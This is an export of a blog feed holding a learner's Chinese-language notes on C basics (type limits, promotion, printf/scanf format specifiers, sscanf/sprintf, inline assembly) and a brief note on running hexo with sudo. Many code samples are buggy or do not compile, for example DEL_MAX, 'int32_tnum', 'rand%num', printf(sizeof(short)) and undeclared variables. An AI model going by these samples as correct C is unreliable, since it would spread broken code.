title="显示极大极小值"></a>显示极大极小值</h1><ul><li>因为之前写过int，unsigned，float，这里只介绍double<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># include&lt;stdio.h&gt;</span><br><span class="line"># include&lt;float.h&gt;</span><br><span class="line"></span><br><span class="line">void main()&#123;</span><br><span class="line">printf(&quot;%400f,%400f&quot;,DEL_MAX,DEL_MIN);//之前可能有地方printf写错了，暂时不改了，反正不会重用这里的代码</span><br><span class="line">//注意这里的极小值其实是小数点后的精确位数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="类型提升"><a href="#类型提升" class="headerlink" title="类型提升"></a>类型提升</h1><ul><li>char,short字符无论有无符号都会在表达式中转换为int or unsigned<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">printf(&quot;%d,%d,%d&quot;,sizeof(short1),sizeof(short2),sizeof(short1+short2))//会输出2,2,4</span><br><span class="line">//sizeof可以判断表达式，short字符无论有无符号都会在表达式中转换为int</span><br></pre></td></tr></table></figure></li></ul><h1 id="可以跨平台移植的软件"><a href="#可以跨平台移植的软件" class="headerlink" title="可以跨平台移植的软件"></a>可以跨平台移植的软件</h1><h2 id="不同平台的C"><a href="#不同平台的C" class="headerlink" title="不同平台的C"></a>不同平台的C</h2><ul><li>不同平台，不同编译器，同样的一个整数数据类型，可能大小不一样</li><li>int16位的情况下是2个字节，32位4个字节</li><li>long 64位linux是8个字节，windows 32,64都是4个字节</li></ul><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdint.h&gt;//数据类型可以跨平台移植，字节都是一样的，只要支持C99的编译器都可以</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void main()&#123;</span><br><span class="line">int32_tnum =123;</span><br><span class="line">printf(&quot;%d,%d&quot;,sizeof(num),num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="bool型数据"><a href="#bool型数据" class="headerlink" title="bool型数据"></a>bool型数据</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdbool.h&gt;//支持C语言的bool型变量</span><br><span class="line">//因为每次都要打印，但是我不想写#include&lt;stdio.h&gt;所以省略以下内容</span><br><span class="line"></span><br><span class="line">void main()&#123;</span><br><span class="line">_Bool bl;</span><br><span class="line">bl = true;//1</span><br><span class="line">printf(&quot;bl=%d&quot;,bl);</span><br><span class="line">printf(&quot;\nsize= %d&quot;,sizeof(bl));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="stdlib-h中的随机数"><a href="#stdlib-h中的随机数" class="headerlink" title="stdlib.h中的随机数"></a>stdlib.h中的随机数</h1><ul><li>随机数生成代码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">time_t</span><br><span class="line">srand((unsigned int)time(&amp;ts));//用系统时间生成随机数种子</span><br><span class="line">a = rand%num //a是生成的随机数范围在0到num之间，如果要改变下线可以加减一个数同时调整上限即可</span><br></pre></td></tr></table></figure><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h2><ul><li>数学计算中有高精度数参与，则结果按高精度表示</li><li>加减乘除取余，自加自减等</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//键盘输入一个数举例</span><br><span class="line">//由于键盘输入常常是字符串（与Python作对比eval函数好用啊）</span><br><span class="line">#define _CRT_SECURE_NO_WARNINGS</span><br><span class="line"></span><br><span class="line">void main()&#123;</span><br><span class="line">int x,y;</span><br><span class="line">scanf_s(&quot;%d&quot;,&amp;x);</span><br><span class="line">scanf_s(&quot;%d&quot;,&amp;y);//键盘输入，输入的就是进入到int x,y中的就是数字了</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>求余运算操作数不能包含double，float类型</li><li>求余运算除数和被除数都可以是负数</li><li>要打印%就必须写上两个%%，例如<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;x%%y=%d&quot;,z);</span><br><span class="line">//输出为x%y = z</span><br></pre></td></tr></table></figure></li><li>求余函数（x-(x&#x2F;y)*y)</li><li>自加自减运算符优先于乘除运算符</li><li>左值就是等号左边的值，等号是赋值运算，赋值运算规则如下<ul><li>左边不能是表达式</li><li>左边不能是常量或者一个数</li><li>赋值号会自动将右值转换为左值的类型</li></ul></li></ul><h3 id="逗号运算符"><a href="#逗号运算符" class="headerlink" title="逗号运算符"></a>逗号运算符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int num = (1,2);</span><br><span class="line">printf(&quot;%d&quot;，num);</span><br><span class="line">//输出为2</span><br></pre></td></tr></table></figure><ul><li>这里的逗号就是顺序求值运算符</li><li>整个表达式的值就是逗号后面的值</li><li>逗号运算符优先级最低</li><li>只在顺序求值时起到求值作用，其他时候只是连接语句或者间隔作用</li></ul><h2 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h2><ul><li>? 表达式1:表达式2<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5 &gt;3 ? printf(&quot;成立&quot;) : printf(&quot;不成立&quot;);</span><br></pre></td></tr></table></figure></li><li>字符串比较，如果是常量是一个内存地址，但是如果除常量外还另外定义了一个变量，字符串变量就算和常量的值相同，用&#x3D;&#x3D;判断的结果也是false</li><li>条件运算符且条件运算符的优先级高于赋值运算符，运算顺序是从右到左</li></ul><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><ul><li>表达式1？表达式2：表达式3这个是三目运算符</li><li>三目运算符会自动进行数据类型转换<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int num =2;</span><br><span class="line">float fl = 1;</span><br><span class="line">printf(&quot;%f&quot;,num &gt; fl ? num : fl);</span><br></pre></td></tr></table></figure></li></ul><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><h1 id="左值和程序实体"><a href="#左值和程序实体" class="headerlink" title="左值和程序实体"></a>左值和程序实体</h1><ul><li>程序实体是内存中的一块区域</li><li>左值是左值表达式简称，是指明程序实体的表达式</li><li>判断一个程序左值的方法是看是否能放在等号左边（有例外const）</li><li>const是例外，初始化的时候可以放在赋值号左边。const变量必须一开始就初始化，而且const是左值</li></ul><h1 id="插入汇编语言"><a href="#插入汇编语言" class="headerlink" title="插入汇编语言"></a>插入汇编语言</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">int x = 10;</span><br><span class="line">_asm//插入汇编语言</span><br><span class="line">&#123;</span><br><span class="line">mov eax,20//将20这个值赋值给寄存器eax</span><br><span class="line">add eax,-15//将eax的值加上-15</span><br><span class="line">mov x,eax//将寄存器eax的值赋值给x</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;%d&quot;,x);//打印5</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>汇编常用语逆向软件开发和嵌入式开发</li></ul><h1 id="输入输出知识补充"><a href="#输入输出知识补充" class="headerlink" title="输入输出知识补充"></a>输入输出知识补充</h1><h2 id="输入double"><a href="#输入double" class="headerlink" title="输入double"></a>输入double</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">double da,db,dc;</span><br><span class="line">scanf_s(&quot;%lf%lf%lf&quot;,&amp;da,&amp;db,&amp;dc);//载入这三个数的地址，double类型必须用%lf</span><br></pre></td></tr></table></figure><h2 id="格式化输出"><a href="#格式化输出" class="headerlink" title="%格式化输出"></a>%格式化输出</h2><ul><li>%格式化输出，后接控制输出形式</li></ul><table><thead><tr><th>字母</th><th>含义</th></tr></thead><tbody><tr><td>d or i</td><td>有符号十进制</td></tr><tr><td>o</td><td>无符号八进制</td></tr><tr><td>x</td><td>无符号十六进制</td></tr><tr><td>e</td><td>标准指数形式输出单双精度实数</td></tr><tr><td>u</td><td>无符号十进制</td></tr><tr><td>c</td><td>输出单个字符</td></tr><tr><td>s</td><td>输出字符串</td></tr><tr><td>f</td><td>小数点形式输出单双精度实数</td></tr><tr><td>g</td><td>选用输出宽度较小的格式输出实数</td></tr><tr><td>a</td><td>按照十六进制的指数输出</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;hellochina%nsfasfa&quot;,&amp;num)</span><br><span class="line">//仅在linux中使用（2014年），%n作为统计之前输出多少个字符，并保存到num中。</span><br><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th>字母</th><th>含义</th></tr></thead><tbody><tr><td>-</td><td>输出的数字或字符以左对齐，右边填空格的方式输出</td></tr><tr><td>0</td><td>输出的空位用0填充</td></tr><tr><td>m(一个正整数)</td><td>输出数据的字段宽度。如果实际位数多于m,按照实际位数输出，如果实际位数少于m,则补以空格</td></tr><tr><td>.n(一个正整数）</td><td>对实数，表示输出n位小数，对字符串，表示截取的字符个数</td></tr><tr><td>（字母）</td><td>输出长整形整数</td></tr><tr><td>*</td><td>输出后面的整数单位，动态变化，*相当于变量</td></tr><tr><td>空格</td><td>正数前面添加一个空格作为前缀，负数不变</td></tr><tr><td>#</td><td>显示八进制和十六进制时会加0和0x方便理解，#确保一定保留小数点</td></tr><tr><td>+</td><td>显示正号</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">printf(&quot;%d&quot;,10);</span><br><span class="line">printf(&quot;\n%ld&quot;,10);</span><br><span class="line">printf(&quot;\n%8d&quot;,10);</span><br><span class="line">printf(&quot;\n%08d&quot;,10);</span><br><span class="line">printf(&quot;\n%-08d&quot;,10);</span><br><span class="line">printf(&quot;\n%.4f&quot;,1.23456789);</span><br><span class="line">printf(&quot;\n%.5s&quot;,&quot;abcdefg&quot;);</span><br><span class="line">for(int i =3; i&lt;10; i++)&#123;</span><br><span class="line">printf(&quot;\n%*d&quot;,i,10);//*与i对应，表明宽度为i，输出10</span><br><span class="line">printf(&quot;\n%*.*f&quot;,2*i,i,10.9);//2*i宽度，i小数点后保留几位</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>不同的数据类型应该用相同的形式输出否则会出问题。</li></ul><h2 id="typedef"><a href="#typedef" class="headerlink" title="typedef"></a>typedef</h2><ul><li>没有创建一个新的数据类型只是为已有数据类型起一个别名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef unsigned int UIT</span><br><span class="line">void main()&#123;</span><br><span class="line">UIT i = 45536;//代替unsigned int </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h2><ul><li>puts类似printf但是puts会自动换行<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;helloworld&quot;);</span><br></pre></td></tr></table></figure></li></ul><h2 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h2><ul><li>输入多个数据可以用空格tab或者回车，但最后一个一定要回车。</li><li>scanf要注意变量初始化，否则如果scanf未按格式输入，很可能会出现无效数据</li><li>scanf中还可以规定输入格式，scanf中如果有%和空格之外的符号，必须输入那些符号进行格式化输入。</li><li>空白符在百分号前无影响，在百分号后会需要输入一个数据但是不影响输入结果。</li><li>scanf中必须传入内存地址也就是变量前必须有&amp;符号</li><li>输入%c时所有转义字符都被当做有效字符，回车这个虽然也可能转义但是一般只要正常输入字符就不会出现转移情况</li><li>扫描字符集合避免错误</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">char str[30] = &#123;0&#125;;//定义字符串，全部初始化为字符&#x27;\0&#x27;</span><br><span class="line">scanf_s(&quot;%[xyz]&quot;,str);//设定只接受xyz，如不是则停止输入。例如输入123xyz，什么都不会输入输出</span><br><span class="line">//中括号内类似正则匹配</span><br><span class="line">//注意\n可以作为匹配条件，此时需注意是否添加\n,否则会影响回车输入</span><br><span class="line">printf(&quot;%s&quot;,str);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int num;</span><br><span class="line">int data;</span><br><span class="line"></span><br><span class="line">scanf_s(&quot;%d%n&quot;,&amp;num,&amp;data);//%n用以统计输入多少个字符</span><br><span class="line">printf(&quot;%d%d&quot;,num,data);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="getchar"><a href="#getchar" class="headerlink" title="getchar"></a>getchar</h2><ul><li>会把回车也当做字符</li></ul><h2 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h2><ul><li>gets_s是安全的输入类似scanf_s</li><li>用处是获取一个字符串</li></ul><h2 id="sprintf-sscanf"><a href="#sprintf-sscanf" class="headerlink" title="sprintf,sscanf"></a>sprintf,sscanf</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sprintf(str,&quot;%s%s&quot;,&quot;ge&quot;,&quot;dit&quot;);</span><br><span class="line">//将两个字符串合并</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int num;</span><br><span class="line">char str[40] = &quot;num = 99&quot;;</span><br><span class="line">sscanf(str,&quot;num=%d&quot;,&amp;num);</span><br><span class="line">printf(&quot;%d&quot;,num);</span><br><span class="line">//通过sscanf去除其中的数字</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int num</span><br><span class="line">char str[40] = &quot;for /1 %i in (1,1,10) do echo china&quot;;</span><br><span class="line">sscanf(str,&quot;for /1 %%i in (1,1,%d) do echo china&quot;,&amp;num);</span><br><span class="line">printf(&quot;\n%d&quot;,num);</span><br><span class="line">num = 20;</span><br><span class="line">sprintf(str,&quot;for /1 %%i in (1,1,%d) do echo china&quot;,num);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CLearning5</title>
      <link href="/2019/09/03/CLearning5/"/>
      <url>/2019/09/03/CLearning5/</url>
      
        <content type="html"><![CDATA[<h1 id="C语言的类型"><a href="#C语言的类型" class="headerlink" title="C语言的类型"></a>C语言的类型</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>sizeof运算符(不是函数）可以求出类型在内存中占用的大小<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">printf(sizeof(short));</span><br><span class="line">printf(sizeof(long));</span><br><span class="line">printf(sizeof(int));</span><br></pre></td></tr></table></figure></li><li>二进制的最高位，表示正负<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;limits.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">printf((&quot;%d,%d&quot;),INT_MAX,INT_MIN);//%d表示十进制的整数</span><br><span class="line">printf((&quot;%u,%u&quot;),UINT_MAX,0);//%u表示十进制的无符号整数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>原码<ul><li>演示代码  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">int x = 1;</span><br><span class="line">printf(&quot;%x&quot;,&amp;x)//打印十六进制数用%x</span><br><span class="line">//计算机的原码表示有符号整数中的正数及无符号整数</span><br></pre></td></tr></table></figure></li></ul></li><li>反码<ul><li>正数：反码原码相同</li><li>负数：符号位为1，其他位取反</li><li>反码等于补码减1</li></ul></li><li>补码<ul><li>正数：原码反码补码都相同</li><li>负数：反码，加1</li><li>计算机的负数用补码解析的（其实正负数都是用补码）</li><li>可以忽略符号进行加减法（两个数直接相加）  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">int x = -1;</span><br><span class="line">printf(&quot;%x&quot;,&amp;x);</span><br><span class="line">printf(&quot;%d,%u&quot;,x,x);</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="构造类型"><a href="#构造类型" class="headerlink" title="构造类型"></a>构造类型</h3><ul><li>数据</li><li>结构体</li><li>共用体</li></ul><h3 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h3><ul><li><p>字符类型</p><ul><li>字符常量  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">//用单引号括起来的单个字符or转义字符，也可以是数字（十进制无需单引号，八进制十六进制可以加单引号）</span><br><span class="line">putchar(&#x27;a&#x27;);</span><br><span class="line">putchar(&#x27;\n&#x27;);</span><br><span class="line">putchar(123);</span><br><span class="line">//其实数字（不加单引号）也就对应ASCIIS表中的字符输出，内存中都以ASCIIS码储存</span><br><span class="line">putchar(&#x27;1&#x27;);//字符1</span><br><span class="line">putchar(1);//1对应的ASCIIS码字符</span><br><span class="line">printf(&quot;双引号内部是字符串常量&quot;);</span><br><span class="line">printf(&quot;&quot;);//每个字符串都有一个/0作为字符串的结束，空字符串也有哦，所以这个占一个字节。一个字符占一个字节。空字符串一个字节，其他有内容字符串至少两个字节。</span><br><span class="line">printf(&quot;%c&quot;,&#x27;a&#x27;);//%c打印字符</span><br><span class="line">printf(&quot;%c，%d&quot;,&#x27;A&#x27;+1); //打印出B,66说明格式化输出可以控制打印的是字符还是ascii码</span><br><span class="line">//C语言中字符串常量不能命名给字符型变量</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>字符变量  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char a = &#x27;a&#x27;</span><br></pre></td></tr></table></figure></li><li>输出可见字符  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">for (int i = 32; i&lt;127; i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c&quot;,i);//我的写法</span><br><span class="line">putchar(i);//课堂写法</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>数值类型</p><ul><li>整形常量</li><li>整数的原码和补码是嵌入式工程师必须掌握的  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">printf(&quot;%d&quot;,10);//10就是十进制的整形常量</span><br><span class="line">printf(&quot;%d&quot;,0100);//0100就是八进制的整形常量</span><br><span class="line">printf(&quot;%d&quot;,0x10);//0x10就是十六进制的整型常量</span><br><span class="line">printf(&quot;%d&quot;,12u);//12u表示无符号整数常量，且之前不可以加负号</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//二进制正数表示</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;limits.h&gt;//用于表示数据类型的最大值和最小值类似于SHORT_MAX or SHORT_MIN,用大写字母表示</span><br><span class="line">void main()&#123;</span><br><span class="line">int num = 10;</span><br><span class="line">printf(&quot;%x&quot;,&amp;num);</span><br><span class="line"></span><br><span class="line">printf(&quot;\n%d,%d&quot;,sizeof(short),SHORT_MAX);</span><br><span class="line">//如果没有unsigned,默认是signed，有一个符号位</span><br><span class="line"></span><br><span class="line">getchar()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>浮点型  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;limits.h&gt;</span><br><span class="line">#include&lt;float.h&gt;//包含float的极限</span><br><span class="line">void main()&#123;</span><br><span class="line">printf(&quot;%f&quot;,1.23);//%f是十进制的浮点数</span><br><span class="line">printf(&quot;%f&quot;,1.23e4);//e/E表示指数，10的多少次方，但是指数部分必须是整数</span><br><span class="line">printf(&quot;%d,%d&quot;,sizeof(1.0),sizeof(1.0f));//默认没有f是double类型（8字节），有f是float类型（4字节））</span><br><span class="line">printf((&quot;%d,%d&quot;),INT_MAX,INT_MIN);</span><br><span class="line">printf((&quot;%f,%f&quot;),FLT_MAX,FLT_MIN);//%f表示默认小数点后6位可以通过%numf控制打印到小数点后的位数</span><br><span class="line">// FLT_MAX表示能表示的最大正负数，FLT_MIN表示最小的正负数）</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;math.h&gt;//有很多常用的数学函数sin or cos</span><br><span class="line">void main()&#123;</span><br><span class="line">//已知三角形的三边求三角形面积</span><br><span class="line">double a,b,c;</span><br><span class="line">a = 1.0;</span><br><span class="line">b = 2.0;</span><br><span class="line">c = 3.0;</span><br><span class="line">p = (a + b + c)/2;</span><br><span class="line">s = sqrt(p * (p - a) * (p - b) * (p - c));//光标所在行右键可以查看定义</span><br><span class="line">printf(&quot;三角形面积为%f&quot;,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>枚举类型</p></li></ul><h3 id="指针类型"><a href="#指针类型" class="headerlink" title="指针类型"></a>指针类型</h3><p>- </p><h3 id="空类型"><a href="#空类型" class="headerlink" title="空类型"></a>空类型</h3><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul><li>声明就是让编译器知道变量的类型和存在</li><li>编译器建立变量符号表<ul><li>用于存放的内存地址，类型的储存，存放名称和数据</li><li>查找是否有无声明变量</li></ul></li></ul><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><h3 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h3><ul><li>默认数据类型转换高精度类型加低精度类型会自动将低精度类型转换为高精度类型</li><li>由于无符号和有符号比较无符号范围更大，自动转换时会自动转换为无符号</li></ul><h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h3><ul><li>强制类型转换格式 类型名（表达式）如(int)1.0</li><li>高精度装换为低精度有精度丢失，所以这个过程必须要有强制类型转换</li><li>高精度转换为低精度还可能出现数据溢出的情况</li><li>强制类型转换得到的所需中间变量，原变量类型。变量值都保持不变。内存会单独开出强制类型转换中间变量的内存空间。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aboutthehexonew</title>
      <link href="/2019/09/03/aboutthexonew/"/>
      <url>/2019/09/03/aboutthexonew/</url>
      
        <content type="html"><![CDATA[<h1 id="建立新的blog文件"><a href="#建立新的blog文件" class="headerlink" title="建立新的blog文件"></a>建立新的blog文件</h1><ul><li>hexo new blogname可以建立文件但是数据库会报错，但是仍会建立文件，之后hexo cleanhexo g hexo d or hexo s 仍需要sudo 命令来进入管理员模式。</li><li>不用sudo新建文件，文件的所有者会是用户自己，这样方便vim编辑文件和实施预览。所以我决定忽略报错问题。</li><li>hexo下所有命令都要用sudo执行，暂时不知道怎么解决。但是解决中遇到过以下问题<ul><li>首先是which hexo的位置是&#x2F;usr&#x2F;local&#x2F;bin&#x2F;hexo 这个软连接，软连接改不改拥有者区别不大因为权限是777.</li><li>找到软连接对应文件发现拥有者并不是root。对应的上级文件夹也不是root用户，不明白为什么hexo仍要用root执行。</li><li>可能原因<ul><li>nodejs安装时就是root执行的后面都是要用到root</li><li>hexo还有其他的文件要求必须用root执行命令（但是这个设置文件我没找到）</li></ul></li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vim-plug2</title>
      <link href="/2019/09/02/vim-plug2/"/>
